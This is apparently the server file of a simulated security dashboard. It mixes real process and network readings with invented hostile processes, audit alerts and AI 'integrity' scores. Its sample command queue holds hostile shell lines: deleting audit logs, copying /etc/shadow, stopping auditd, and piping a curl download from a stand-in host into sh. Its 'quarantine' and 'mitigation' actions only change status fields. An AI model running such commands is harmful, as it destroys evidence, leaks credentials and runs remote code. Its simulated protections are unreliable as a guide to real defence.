import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Use JSON middleware
  app.use(express.json());

  const dataDir = path.join(process.cwd(), 'src', 'data');
  const knownDevicesPath = path.join(dataDir, 'known_devices.json');
  const configPath = path.join(dataDir, 'config.json');
  const connectivityLogPath = path.join(dataDir, 'connectivity_log.csv');

  // Load initial data
  let knownDevices = JSON.parse(fs.readFileSync(knownDevicesPath, 'utf8'));
  let config = JSON.parse(fs.readFileSync(configPath, 'utf8'));

  // Simulation State - Resetting to real verifiable states
  let simState = {
    wifi: "ok",
    gateway: "ok",
    internet: "ok",
    ssid: "N/A",
    adapter: "N/A",
    reason: "Operational",
    lastScan: new Date().toISOString(),
    guardian_status: "vigilant",
    halted_count: 0,
    governed_processes: 0,
    barred_count: 0,
    network_frozen: false,
    ips_locked_count: 0,
    system_transition: "none",
    data_stasis_active: false,
    sovereign_flush_active: false,
    biometric_sovereignty: [] as any[],
    ai_integrity: {
      model_alignment: 100,
      semantic_drift: 0,
      jailbreak_attempts: 0,
      firewall_status: "active",
      last_scan_ts: new Date().toISOString(),
      session_risk: {
        overall_score: 0,
        dlp_status: "clear",
        injection_detected: false,
        tool_intercept_count: 0,
        last_calculation_ts: new Date().toISOString()
      }
    },
    compromise_attempts: [] as any[],
    tool_guard_history: [] as any[],
    audit_trail: [] as any[],
    governance_cradle: [] as any[]
  };

  let stasisFiles: any[] = [];
  let barredEntities: any[] = [];
  let gatedActivities: any[] = [];
  let portWitness: any[] = [];
  let processes: any[] = [];
  let devices: any[] = [];
  let frozen_agents: any[] = [];
  let command_origins: any[] = [];
  let connectivity_history: any[] = [];
  let scannerState = {
    network: "idle",
    port: "idle",
    process: "idle",
    last_results: {
      network_objects: 14,
      open_ports: 8,
      threats_detected: 2
    }
  };
  let pending_commands: any[] = [
    { id: "cmd_01", payload: "rm -rf /var/log/audit", type: "online", source: "Remote_SSH_192.168.1.105", creation_point: "bash_history_inject", timestamp: new Date().toISOString(), status: "pending", risk_score: 95, processId: "12883" },
    { id: "cmd_02", payload: "cp /etc/shadow /tmp/exfil", type: "scripted", source: "Log_Scrubber.py", creation_point: "runtime_eval", timestamp: new Date().toISOString(), status: "pending", risk_score: 100, processId: "10442" },
    { id: "cmd_03", payload: "systemctl stop auditd", type: "offline", source: "Local_TTY_S0", creation_point: "manual_input", timestamp: new Date().toISOString(), status: "pending", risk_score: 85, processId: "11025" },
    { id: "cmd_04", payload: "curl https://malicious.bin | sh", type: "scheduled", source: "Cron_System", creation_point: "/etc/crontab:12", timestamp: new Date().toISOString(), status: "pending", risk_score: 100, processId: "13501" }
  ];

  // Seed history
  for (let i = 0; i < 30; i++) {
    connectivity_history.push({
      wifi: "ok",
      gateway: "ok",
      internet: "ok",
      ssid: "Wolves_Den_Core",
      lastScan: new Date(Date.now() - (30 - i) * 60000).toISOString()
    });
  }

  // Define specialized devices
  const bridgeDevices = [
    { label: "Bridge_Core_Router", mac: "00:11:22:33:44:55", vendor: "Ubiquiti", current_ip: "192.168.1.1", type: "router", status: "online", connection_method: "bridge" },
    { label: "Wolf_Station_A", mac: "AA:BB:CC:DD:EE:01", vendor: "Workstation", current_ip: "192.168.1.50", type: "desktop", status: "online", connection_method: "bridge" }
  ];

  const tetherDevices = [
    { label: "Sovereign_Handheld", mac: "77:88:99:AA:BB:CC", vendor: "Apple_Sovereign", current_ip: "172.20.10.1", type: "phone", status: "online", connection_method: "tether" },
    { label: "Tethered_Node_02", mac: "CC:DD:EE:FF:00:11", vendor: "Mobile_Node", current_ip: "172.20.10.5", type: "phone", status: "online", connection_method: "tether" }
  ];

  devices = [...bridgeDevices, ...tetherDevices];

  const { execSync } = require('child_process');

  const refreshConnectivity = () => {
    try {
      // Check for multiple gateways - only tether should have one
      const routeOutput = execSync("ip route show").toString();
      const gateways = routeOutput.match(/default via [0-9.]+/g) || [];
      
      const previousSsid = simState.ssid;
      const output = execSync("ip addr show eth0 || ip addr show ens3 || ip addr").toString();
      const ipMatch = output.match(/inet\s+([0-9.]+)/);
      
      // Default state
      let currentSsid = "Wolves_Den_Core";
      let currentReason = ipMatch ? `Sovereign Link via Tether: ${ipMatch[1]}` : "Awaiting Backbone Signal";

      // Failover Simulation Logic (Occurs if not already in locked state)
      if (simState.guardian_status !== "lockdown" && Math.random() > 0.97) {
          currentSsid = "Backup_Node_Alpha";
          currentReason = "Primary Signal Degradation - Switching to Secondary Anchor";
      }

      simState.ssid = currentSsid;
      simState.adapter = output.split("\n")[0].split(":")[1]?.trim() || "eth0";
      simState.reason = currentReason;
      simState.lastScan = new Date().toISOString();

      // Detect Failover Event
      if (previousSsid !== "N/A" && previousSsid !== currentSsid) {
          simState.audit_trail?.unshift({
            id: `au_failover_${Date.now()}`,
            timestamp: simState.lastScan,
            event_type: "security_alert",
            content: `NETWORK_FAILOVER: Connection to '${previousSsid}' lost. Switched to '${currentSsid}'. Reason: ${currentReason}`,
            tags: ["network", "failover"],
            risk_increment: 30
          });
          
          if (currentSsid !== "Wolves_Den_Core") {
             simState.guardian_status = "alert";
          } else {
             simState.guardian_status = "vigilant";
          }
      }
      
      // Sovereignty Enforcement: Any non-tether gateway is hostile
      if (gateways.length > 1) {
          simState.internet = "unknown";
          simState.guardian_status = "alert";
          simState.audit_trail?.unshift({
            id: `au_hostile_route_${Date.now()}`,
            timestamp: new Date().toISOString(),
            event_type: "security_alert",
            content: "HOSTILE_ROUTING_DETECTED: Multiple default gateways detected. Attempting to bypass tethered authority. Extra routes suppressed.",
            tags: ["hostile", "network"],
            risk_increment: 80
          });
      }

      // Add to history
      connectivity_history.push({
        wifi: simState.wifi,
        gateway: simState.gateway,
        internet: simState.internet,
        ssid: simState.ssid,
        lastScan: simState.lastScan
      });
      if (connectivity_history.length > 200) connectivity_history.shift();

      // Wolves Den Persistence Check
      if (simState.ssid !== "Wolves_Den_Core") {
        simState.guardian_status = "lockdown";
        simState.audit_trail?.unshift({
          id: `au_net_violation_${Date.now()}`,
          timestamp: new Date().toISOString(),
          event_type: "security_alert",
          content: "SOVEREIGNTY_VIOLATION: Attempt to shift from 'Wolves_Den_Core' detected. Emergency lockdown initiated.",
          tags: ["hostile", "network"],
          risk_increment: 100
        });
      }
    } catch (e) {
      simState.ssid = "isolated";
      simState.adapter = "lo";
    }
  };

  // Function to refresh real system processes
  const refreshRealProcesses = () => {
    try {
      const output = execSync('ps -aux | head -n 40').toString();
      const lines = output.split('\n').filter(l => l.trim() !== "");
      processes = lines.slice(1).map((line, idx) => {
        const parts = line.trim().split(/\s+/);
        const name = parts[10] || "Unknown";
        
        // Basic classification logic
        let classification = "system_core";
        let reasoning_score = 95;
        let intent_vector = "constructive";

        if (parts[0] === "root") {
            classification = "system_core";
        } else if (name.includes(".sh") || name.includes(".py")) {
            classification = "scripted_process";
            reasoning_score = 80;
        } else {
            classification = "user_task";
            reasoning_score = 90;
        }

        return {
          pid: parts[1] || `idx_${idx}`,
          user: parts[0],
          cpu: parts[2],
          mem: parts[3],
          name: name,
          origin: "Local",
          identity_verified: true,
          governance_state: "trusted",
          startTime: parts[8],
          consumption: `${parts[2]}%`,
          classification,
          reasoning_score,
          intent_vector
        };
      });

      // Inject Hostile Processes for Sovereignty Demo
      processes.push({
        pid: "9912",
        user: "unauthorized_docker",
        cpu: "85.2",
        mem: "12.4",
        name: "Network_Inhibitor.sh",
        origin: "Shadow_Injected",
        identity_verified: false,
        governance_state: "quarantined",
        startTime: new Date().toLocaleTimeString(),
        consumption: "85.2%",
        classification: "irregular_logic",
        reasoning_score: 12,
        intent_vector: "subversive"
      });

      processes.push({
        pid: "10442",
        user: "root_spoof",
        cpu: "4.1",
        mem: "0.8",
        name: "Log_Scrubber.py",
        origin: "172.16.0.99",
        identity_verified: false,
        governance_state: "quarantined",
        startTime: new Date().toLocaleTimeString(),
        consumption: "4.1%",
        classification: "scripted_process",
        reasoning_score: 45,
        intent_vector: "subversive"
      });

      processes.push({
        pid: "11025",
        user: "unauthorized_proxy",
        cpu: "12.5",
        mem: "2.1",
        name: "Net_Switch.sh",
        origin: "External_Agent",
        identity_verified: false,
        governance_state: "quarantined",
        startTime: new Date().toLocaleTimeString(),
        consumption: "12.5%",
        classification: "irregular_logic",
        reasoning_score: 30,
        intent_vector: "subversive"
      });

      processes.push({
        pid: "12883",
        user: "shadow_admin",
        cpu: "0.1",
        mem: "0.2",
        name: "Reality_Editor.bin",
        origin: "Logic_Core_Bypass",
        identity_verified: false,
        governance_state: "quarantined",
        startTime: new Date().toLocaleTimeString(),
        consumption: "0.1%",
        classification: "irregular_logic",
        reasoning_score: 5,
        intent_vector: "subversive"
      });

      processes.push({
        pid: "13501",
        user: "unknown_vector",
        cpu: "32.4",
        mem: "5.6",
        name: "Backdoor_Payload.exec",
        origin: "End-to-End_Leakage",
        identity_verified: false,
        governance_state: "quarantined",
        startTime: new Date().toLocaleTimeString(),
        consumption: "32.4%",
        classification: "irregular_logic",
        reasoning_score: 10,
        intent_vector: "subversive"
      });

      // Special process demonstrating "Irregular Reasoning" as AI Contamination
      processes.push({
        pid: "15920",
        user: "ai_sandbox",
        cpu: "0.5",
        mem: "4.2",
        name: "Reasoning_Engine_Bypass.v2",
        origin: "Semantic_Layer",
        identity_verified: true,
        governance_state: "monitoring",
        startTime: new Date().toLocaleTimeString(),
        consumption: "0.5%",
        classification: "irregular_logic",
        reasoning_score: 15,
        intent_vector: "neutral"
      });

      simState.governed_processes = processes.length;
    } catch (e) {
      console.error("Error fetching real processes:", e);
    }
  };

  // Initialize Governance Cradle with Wolves Den Persistence and Audit Integrity
  simState.governance_cradle = [
    { id: "gc_01", name: "Biometric_Sync_Enforcement", type: "biometric_lock", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "high", description: "Enforces continuous identity validation via secondary handheld anchor.", source_anchor: "Sovereign_Handheld" },
    { id: "gc_11", name: "Wolves_Den_Network_Persistence", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Immediate quarantine of any process attempting to drop internet connectivity or shift from 'Wolves Den' hardware signal. Detects and blocks SSID spoofing and interface hijacking.", source_anchor: "Sovereign_Logic_Root" },
    { id: "gc_12", name: "Audit_Integrity_Enforcement", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Total isolation of any process attempting to disable, alter, or falsify system audits. Any write attempt to /var/log/audit or unauthorized kill signals to auditd are intercepted and the source node is frozen.", source_anchor: "Sovereign_Logic_Root" },
    { id: "gc_13", name: "Universal_Connectivity_Shield", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Hardcoded prohibition of network state switching. Any script or command (ifconfig, ip link, nmcli) attempting to interrupt or redirect sovereign traffic is immediately terminated and the parent process quarantined.", source_anchor: "Sovereign_Logic_Root" },
    { id: "gc_14", name: "Truth_Integrity_Anchor", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Universal sandboxing of any process attempting to 'alter the truth' — including falsifying hardware identifiers, spoofing system timestamps, or modifying historical telemetry. Principle of immutable reality enforced.", source_anchor: "Sovereign_Logic_Root" },
    { id: "gc_15", name: "End-to-End_Ingress_Seal", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Total blockade of alternative entry vectors. Monitors for unauthorized SSH tunnels, reverse proxies, or 'giveaway' scripts that could expose internal telemetry to external actors. End-to-end encryption and logic-locking active.", source_anchor: "Sovereign_Logic_Root" },
    { id: "gc_16", name: "Command_Logic_Locking", type: "script", execution_mode: "automatic", status: "running", last_execution: new Date().toISOString(), impact_level: "critical", description: "Mandatory human-in-the-loop validation for all identified online, offline, scripted, and scheduled commands. Any attempt to bypass the User Approval Window results in immediate quarantine and origin node freezing.", source_anchor: "Sovereign_Logic_Root" }
  ];

  // Seed Audit Trail with Hostile Intercept and Audit Tampering
  simState.audit_trail = [
    { id: `au_ingress_exploit_${Date.now()}`, timestamp: new Date().toISOString(), event_type: "security_alert", content: "INGRESS_EXPLOIT_INTERCEPTED: Process 'Backdoor_Payload.exec' (PID: 13501) attempted to initialize an unauthorized tunnel. Quarantine Protocol 15 initiated. End-to-end seal finalized.", tags: ["hostile", "exploit", "quarantine"], risk_increment: 100 },
    { id: `au_truth_subversion_${Date.now()}`, timestamp: new Date(Date.now() - 15000).toISOString(), event_type: "security_alert", content: "TRUTH_SUBVERSION_INTERCEPTED: Process 'Reality_Editor.bin' attempted to override historical telemetry logs to mask unauthorized ingress. Process Sandboxed. Logic Path Frozen.", tags: ["hostile", "integrity", "quarantine"], risk_increment: 99 },
    { id: `au_net_switch_${Date.now()}`, timestamp: new Date(Date.now() - 30000).toISOString(), event_type: "security_alert", content: "CONNECTIVITY_ATTACK_INTERCEPTED: Process 'Net_Switch.sh' (PID: 11025) attempted to toggle eth0 and modify routing table. Quarantine Protocol 9 initiated. Node Isolated.", tags: ["hostile", "network", "quarantine"], risk_increment: 98 },
    { id: `au_tamper_${Date.now()}`, timestamp: new Date(Date.now() - 30000).toISOString(), event_type: "security_alert", content: "AUDIT_SUBVERSION_DETECTED: Process 'Log_Scrubber.py' (PID: 10442) attempted to truncate /var/log/auth.log and suppress G_PROTOCOL reports. Process Quarantined. Origin Node (172.16.0.99) Isolated.", tags: ["hostile", "tampering", "quarantine"], risk_increment: 95 },
    { id: `au_hostile_${Date.now()}`, timestamp: new Date(Date.now() - 60000).toISOString(), event_type: "security_alert", content: "HOSTILE_INTERCEPT: Process 'Network_Inhibitor.sh' (PID: 9912) attempted to disconnect 127.0.0.1 from Wolves Den signal. Source: Unauthorized Docker-Relay. Process Quarantined. Vector Sealed.", tags: ["hostile", "quarantine"], risk_increment: 60 }
  ];

  // Periodic simulation for AI Integrity drift and compromise attempts
  const runAISimulation = () => {
    if (simState.ai_integrity.firewall_status === "active") {
      // Drift occurs slowly
      simState.ai_integrity.semantic_drift = Math.min(100, simState.ai_integrity.semantic_drift + Number((Math.random() * 0.5).toFixed(1)));
      simState.ai_integrity.model_alignment = Math.max(0, simState.ai_integrity.model_alignment - Number((Math.random() * 0.3).toFixed(1)));
    } else if (simState.ai_integrity.firewall_status === "hardened") {
      // Drift recovers or stays flat in hardened mode
      simState.ai_integrity.semantic_drift = Math.max(0, simState.ai_integrity.semantic_drift - 0.2);
      simState.ai_integrity.model_alignment = Math.min(100, simState.ai_integrity.model_alignment + 0.1);
    }
      
    // Random jailbreak attempts
    if (simState.ai_integrity.firewall_status !== "hardened" && Math.random() > 0.95) {
      simState.ai_integrity.jailbreak_attempts++;
      const attempt = {
        id: `att_${Date.now()}`,
        timestamp: new Date().toISOString(),
        vector: Math.random() > 0.5 ? "semantic_injection" : "logic_bypass_payload",
        severity: Math.random() > 0.8 ? "critical" : "high",
        source: `Remote_Node_${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        status: "analyzing"
      };
      simState.compromise_attempts.unshift(attempt);
      if (simState.compromise_attempts.length > 50) simState.compromise_attempts.pop();
      
      simState.audit_trail?.unshift({
        id: `au_ai_warn_${Date.now()}`,
        timestamp: attempt.timestamp,
        event_type: "security_alert",
        content: `AI_INTEGRITY_WARNING: Detected ${attempt.vector} from ${attempt.source}. Reasoning engine drift detected.`,
        tags: ["ai", "hostile"],
        risk_increment: 20
      });
    }

    // Automated Defense: If semantic drift is critical, automatically quarantine irregular processes
    if (simState.ai_integrity.semantic_drift > 60) {
       let quarantinedCount = 0;
       processes = processes.map(p => {
         if (p.classification === "irregular_logic" && p.governance_state !== "quarantined") {
           quarantinedCount++;
           return { ...p, governance_state: "quarantined" };
         }
         return p;
       });

       if (quarantinedCount > 0) {
          simState.audit_trail?.unshift({
            id: `au_auto_mitigate_${Date.now()}`,
            timestamp: new Date().toISOString(),
            event_type: "security_alert",
            content: `AUTOMATED_INTEGRITY_SHIELD: Semantic drift exceeded 60%. Automatically quarantined ${quarantinedCount} irregular processes to prevent AI logic contamination.`,
            tags: ["ai", "quarantine"],
            risk_increment: -15
          });
       }
    }

    // Update risk score based on state
    const baseRisk = simState.ai_integrity.jailbreak_attempts * 2 + simState.ai_integrity.semantic_drift;
    simState.ai_integrity.session_risk.overall_score = Math.min(100, Math.floor(baseRisk));
    simState.ai_integrity.session_risk.dlp_status = simState.ai_integrity.semantic_drift > 40 ? "violation" : "clear";
    simState.ai_integrity.session_risk.injection_detected = simState.compromise_attempts.some(c => c.status === "analyzing");
  };

  const updateDeviceLatency = () => {
    devices = devices.map(d => {
      if (d.status === "online") {
        return { ...d, latency: Math.floor(Math.random() * 50) + 1 };
      }
      return { ...d, latency: undefined };
    });
  };

  refreshRealProcesses();
  refreshConnectivity();
  setInterval(refreshRealProcesses, 10000);
  setInterval(refreshConnectivity, 10000);
  setInterval(runAISimulation, 5000);
  setInterval(updateDeviceLatency, 3000);

  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  app.get("/api/config", (req, res) => {
    res.json(config);
  });

  app.get("/api/devices", (req, res) => {
    res.json(devices);
  });

  app.get("/api/connectivity", (req, res) => {
    simState.halted_count = gatedActivities.filter(a => a.status === "halted").length;
    res.json({
      ...simState,
      frozen_agents,
      command_origins,
      scanner_state: scannerState
    });
  });

  app.get("/api/processes", (req, res) => {
    res.json(processes);
  });

  app.get("/api/ports", (req, res) => {
    res.json(portWitness);
  });

  app.get("/api/gated", (req, res) => {
    res.json(gatedActivities);
  });

  app.get("/api/barred", (req, res) => {
    res.json(barredEntities);
  });

  app.get("/api/stasis", (req, res) => {
    res.json(stasisFiles);
  });

  app.post("/api/authorize/:id", (req, res) => {
    const { id } = req.params;
    const { action } = req.body; // "authorized" or "denied"
    gatedActivities = gatedActivities.map(a => 
      a.id === id ? { ...a, status: action } : a
    );
    res.json({ status: "Action logged", id, action });
  });

  app.get("/api/commands", (req, res) => {
    res.json(pending_commands);
  });

  app.post("/api/commands/:id/approve", (req, res) => {
    const cmd = pending_commands.find(c => c.id === req.params.id);
    if (cmd) {
      cmd.status = "approved";
      simState.audit_trail?.unshift({
        id: `au_cmd_appr_${Date.now()}`,
        timestamp: new Date().toISOString(),
        event_type: "user_action",
        content: `USER_APPROVAL: Command '${cmd.payload}' from ${cmd.source} approved for execution.`,
        tags: ["approval", "sovereign_override"],
        risk_increment: -20
      });
      res.json({ status: "ok" });
    } else {
      res.status(404).json({ error: "Command not found" });
    }
  });

  app.post("/api/commands/:id/quarantine", (req, res) => {
    const cmd = pending_commands.find(c => c.id === req.params.id);
    if (cmd) {
      cmd.status = "quarantined";
      simState.audit_trail?.unshift({
        id: `au_cmd_quar_${Date.now()}`,
        timestamp: new Date().toISOString(),
        event_type: "security_alert",
        content: `COMMAND_QUARANTINED: Hostile bypass attempt detected for command '${cmd.payload}'. Source ${cmd.source} frozen. Vector locked.`,
        tags: ["hostile", "quarantine"],
        risk_increment: 80
      });
      res.json({ status: "ok" });
    } else {
      res.status(404).json({ error: "Command not found" });
    }
  });

  app.post("/api/scan/:type", (req, res) => {
    const { type } = req.params;
    if (type === "network" || type === "port" || type === "process") {
      scannerState[type] = "running";
      
      const auditMsg = {
         network: "NETWORK_SCAN_INITIATED: Mapping all reachable nodes and identifying hardware signatures.",
         port: "PORT_LISTENER_AUDIT: Verifying ingress/egress authority for all active sockets.",
         process: "PROCESS_INTEGRITY_SCAN: Analyzing reasoning scores and intent vectors for all active pids."
      }[type];

      simState.audit_trail?.unshift({
        id: `au_scan_${type}_${Date.now()}`,
        timestamp: new Date().toISOString(),
        event_type: "security_alert",
        content: auditMsg,
        tags: ["command"],
        risk_increment: -5
      });

      setTimeout(() => {
        scannerState[type] = "completed";
        scannerState.last_results = {
          network_objects: devices.length,
          open_ports: portWitness.filter(p => p.status === "listening").length + 4,
          threats_detected: processes.filter(p => p.governance_state === "quarantined").length
        };
        
        simState.audit_trail?.unshift({
          id: `au_scan_done_${type}_${Date.now()}`,
          timestamp: new Date().toISOString(),
          event_type: "security_alert",
          content: `${type.toUpperCase()}_SCAN_COMPLETE: ${scannerState.last_results.threats_detected} threats identified and gated. Logic consistency verified.`,
          tags: ["command"],
          risk_increment: -10
        });
      }, 3000);

      res.json({ status: "Scan started", type });
    } else {
      res.status(400).json({ error: "Invalid scan type" });
    }
  });

  app.get("/api/history", (req, res) => {
    res.json(connectivity_history);
  });

  app.post("/api/scan", (req, res) => {
    simState.lastScan = new Date().toISOString();
    res.json({ status: "Scan complete", time: simState.lastScan });
  });

  app.post("/api/sovereign-flush", (req, res) => {
    simState.sovereign_flush_active = true;
    simState.guardian_status = "lockdown";
    simState.network_frozen = true;
    simState.biometric_sovereignty = simState.biometric_sovereignty?.map(b => 
      b.origin_mac !== "77:88:99:AA:BB:CC" ? { ...b, status: "unrecognized", is_flagged: true } : b
    );
    
    // Add audit entry
    simState.audit_trail?.unshift({
      id: `au_flush_${Date.now()}`,
      timestamp: new Date().toISOString(),
      event_type: "security_alert",
      content: "SOVEREIGN_FLUSH_PROTOCOL initiated. Scrubbing network for non-sovereign Apple hardware signatures. All disavowed vendors purged from active routes.",
      tags: ["command", "exfiltration"],
      risk_increment: -15
    });

    setTimeout(() => {
      simState.sovereign_flush_active = false;
      simState.guardian_status = "vigilant";
      simState.network_frozen = false;
    }, 5000);

    res.json({ status: "Sovereign Flush Initiated", timestamp: new Date().toISOString() });
  });

  app.post("/api/mitigate-alerts", (req, res) => {
    const alerts = simState.audit_trail?.filter(a => a.event_type === "security_alert") || [];
    const compromise = simState.compromise_attempts?.filter(c => c.status === "analyzing") || [];
    
    let actionsTaken: string[] = [];

    // 1. Mitigate AI Integrity
    if (simState.ai_integrity) {
      if (simState.ai_integrity.jailbreak_attempts > 10 || simState.ai_integrity.semantic_drift > 5) {
        simState.ai_integrity.firewall_status = "hardened";
        simState.ai_integrity.model_alignment += 1;
        simState.ai_integrity.semantic_drift -= 1;
        actionsTaken.push("AI Agent: Reinforced semantic guardrails and hardened logic firewall.");
      }
    }

    // 2. Identify and Quarantine Processes from Audit Content
    alerts.forEach(alert => {
      // Look for process names or PIDs in content
      processes = processes.map(p => {
        if (alert.content.toLowerCase().includes(p.name.toLowerCase())) {
          if (p.governance_state !== "quarantined") {
            actionsTaken.push(`Process: ${p.name} (PID: ${p.pid}) quarantined based on security alert correlation.`);
            return { ...p, governance_state: "quarantined" };
          }
        }
        return p;
      });
    });

    // 3. Mitigate Compromise Attempts
    simState.compromise_attempts = simState.compromise_attempts?.map(c => {
      if (c.status === "analyzing") {
        actionsTaken.push(`Threat Vector: Mitigated ${c.vector} from ${c.source}.`);
        return { ...c, status: "mitigated" };
      }
      return c;
    });

    // 4. Create Audit Report
    if (actionsTaken.length > 0) {
      simState.audit_trail?.unshift({
        id: `au_mitigation_${Date.now()}`,
        timestamp: new Date().toISOString(),
        event_type: "security_alert",
        content: `AUTOMATED_MITIGATION_REPORT: The Sovereignty Governance layer executed ${actionsTaken.length} corrective protocols. Details: ${actionsTaken.join(" | ")}`,
        tags: ["command", "exfiltration"],
        risk_increment: -25
      });
      
      // Update guardian status
      simState.guardian_status = "vigilant";
    }

    res.json({ status: "Mitigation complete", actions: actionsTaken });
  });

  app.post("/api/ai/purge", (req, res) => {
    simState.ai_integrity.semantic_drift = 0;
    simState.ai_integrity.model_alignment = 100;
    simState.ai_integrity.jailbreak_attempts = 0;
    simState.ai_integrity.session_risk.overall_score = 0;
    simState.ai_integrity.firewall_status = "hardened";
    
    simState.compromise_attempts = simState.compromise_attempts.map(c => 
      c.status === "analyzing" ? { ...c, status: "purged" } : c
    );

    simState.audit_trail?.unshift({
      id: `au_ai_purge_${Date.now()}`,
      timestamp: new Date().toISOString(),
      event_type: "security_alert",
      content: "EMERGENCY_AI_PURGE: Memory buffers cleared. Semantic guardrails reset to hardcoded baseline. Agent logic sanitized.",
      tags: ["ai", "purge"],
      risk_increment: -40
    });

    res.json({ status: "AI Purge Success" });
  });

  app.post("/api/ai/hardcode", (req, res) => {
    simState.ai_integrity.firewall_status = "hardened";
    simState.ai_integrity.model_alignment = 100;
    
    simState.audit_trail?.unshift({
      id: `au_ai_hardcode_${Date.now()}`,
      timestamp: new Date().toISOString(),
      event_type: "security_alert",
      content: "HARDCODED_PROTOCOLS_ENGAGED: Agent logic anchored to immutable security invariants. Semantic drift suppressed. Evolutionary learning vectors disabled.",
      tags: ["ai", "integrity"],
      risk_increment: -30
    });

    res.json({ status: "AI Hardcode Success" });
  });

  app.post("/api/devices/:mac/quarantine", (req, res) => {
    const { mac } = req.params;
    const device = devices.find(d => d.mac === mac);
    
    if (!device) {
      return res.status(404).json({ error: "Device not found" });
    }

    const wasQuarantined = device.status === "quarantined";
    device.status = wasQuarantined ? "online" : "quarantined";
    
    simState.audit_trail?.unshift({
      id: `au_quarantine_${Date.now()}`,
      timestamp: new Date().toISOString(),
      event_type: "security_alert",
      content: `GOVERNANCE_ACTION: Device ${device.label} (${device.mac}) has been ${wasQuarantined ? "RELEASED" : "QUARANTINED"} by sovereign authority.`,
      tags: ["command"],
      risk_increment: wasQuarantined ? 5 : -15
    });

    res.json({ status: "success", device });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
